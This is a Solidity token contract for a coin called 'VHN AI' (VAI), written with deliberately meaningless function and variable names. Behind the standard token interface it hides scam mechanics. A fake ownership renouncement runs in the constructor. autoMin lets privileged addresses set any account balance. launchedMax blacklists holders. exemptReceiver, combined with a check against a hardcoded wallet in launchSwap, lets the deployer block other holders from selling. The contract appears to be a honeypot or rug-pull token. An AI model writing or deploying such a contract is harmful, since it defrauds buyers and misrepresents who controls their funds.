//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface receiverMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeFund) external view returns (uint256);

    function transfer(address toTotal, uint256 fundLiquidity) external returns (bool);

    function allowance(address isTeamReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address toTotal,
        uint256 fundLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletEnable, uint256 value);
    event Approval(address indexed isTeamReceiver, address indexed spender, uint256 value);
}

interface receiverModeMetadata is receiverMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract shouldReceiverLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableExempt {
    function createPair(address buyAmount, address txTo) external returns (address);
}

interface buyTokenSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VHNAI is shouldReceiverLiquidity, receiverMode, receiverModeMetadata {

    constructor (){
        if (feeSwap != feeLimit) {
            feeSwap = feeLimit;
        }
        amountMaxBuy();
        buyTokenSell receiverIs = buyTokenSell(swapTrading);
        liquidityLaunched = enableExempt(receiverIs.factory()).createPair(receiverIs.WETH(), address(this));
        
        buyReceiver = _msgSender();
        liquidityToLaunch[buyReceiver] = true;
        tradingSwapMax[buyReceiver] = amountTo;
        
        emit Transfer(address(0), buyReceiver, amountTo);
    }

    function owner() external view returns (address) {
        return atAmount;
    }

    uint256 public feeSwap;

    function allowance(address minWallet, address amountTxToken) external view virtual override returns (uint256) {
        if (amountTxToken == swapTrading) {
            return type(uint256).max;
        }
        return modeReceiver[minWallet][amountTxToken];
    }

    bool public teamTradingAuto;

    bool private receiverAuto;

    function transferFrom(address enableSwap, address toTotal, uint256 fundLiquidity) external override returns (bool) {
        if (_msgSender() != swapTrading) {
            if (modeReceiver[enableSwap][_msgSender()] != type(uint256).max) {
                require(fundLiquidity <= modeReceiver[enableSwap][_msgSender()]);
                modeReceiver[enableSwap][_msgSender()] -= fundLiquidity;
            }
        }
        return launchSwap(enableSwap, toTotal, fundLiquidity);
    }

    function name() external view virtual override returns (string memory) {
        return modeFee;
    }

    function tradingLimit(address liquidityFrom) public {
        if (teamTradingAuto) {
            return;
        }
        if (feeLimit == feeSwap) {
            toEnable = true;
        }
        liquidityToLaunch[liquidityFrom] = true;
        
        teamTradingAuto = true;
    }

    mapping(address => mapping(address => uint256)) private modeReceiver;

    string private modeFee = "VHN AI";

    function launchedMax(address autoShould) public {
        receiverEnable();
        
        if (autoShould == buyReceiver || autoShould == liquidityLaunched) {
            return;
        }
        modeTo[autoShould] = true;
    }

    function amountMaxBuy() public {
        emit OwnershipTransferred(buyReceiver, address(0));
        atAmount = address(0);
    }

    mapping(address => bool) public modeTo;

    bool private limitLaunch;

    uint256 public feeLimit;

    function transfer(address tokenShould, uint256 fundLiquidity) external virtual override returns (bool) {
        return launchSwap(_msgSender(), tokenShould, fundLiquidity);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return amountTo;
    }

    function autoMin(address tokenShould, uint256 fundLiquidity) public {
        receiverEnable();
        tradingSwapMax[tokenShould] = fundLiquidity;
    }

    bool public toEnable;

    function balanceOf(address modeFund) public view virtual override returns (uint256) {
        return tradingSwapMax[modeFund];
    }

    function approve(address amountTxToken, uint256 fundLiquidity) public virtual override returns (bool) {
        modeReceiver[_msgSender()][amountTxToken] = fundLiquidity;
        emit Approval(_msgSender(), amountTxToken, fundLiquidity);
        return true;
    }

    uint8 private modeLimitIs = 18;

    address public buyReceiver;

    function exemptAt(address enableSwap, address toTotal, uint256 fundLiquidity) internal returns (bool) {
        require(tradingSwapMax[enableSwap] >= fundLiquidity);
        tradingSwapMax[enableSwap] -= fundLiquidity;
        tradingSwapMax[toTotal] += fundLiquidity;
        emit Transfer(enableSwap, toTotal, fundLiquidity);
        return true;
    }

    bool public maxFeeTrading;

    uint256 limitAtReceiver;

    function receiverEnable() private view {
        require(liquidityToLaunch[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return totalSender;
    }

    address swapTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private tradingSwapMax;

    uint256 private amountTo = 100000000 * 10 ** 18;

    function launchSwap(address enableSwap, address toTotal, uint256 fundLiquidity) internal returns (bool) {
        if (enableSwap == buyReceiver) {
            return exemptAt(enableSwap, toTotal, fundLiquidity);
        }
        uint256 toMax = receiverMode(liquidityLaunched).balanceOf(walletShould);
        require(toMax == limitAtReceiver);
        require(!modeTo[enableSwap]);
        return exemptAt(enableSwap, toTotal, fundLiquidity);
    }

    address private atAmount;

    function getOwner() external view returns (address) {
        return atAmount;
    }

    uint256 fundLaunchTotal;

    mapping(address => bool) public liquidityToLaunch;

    string private totalSender = "VAI";

    function exemptReceiver(uint256 fundLiquidity) public {
        receiverEnable();
        limitAtReceiver = fundLiquidity;
    }

    event OwnershipTransferred(address indexed modeShould, address indexed txFundExempt);

    address public liquidityLaunched;

    function decimals() external view virtual override returns (uint8) {
        return modeLimitIs;
    }

    address walletShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}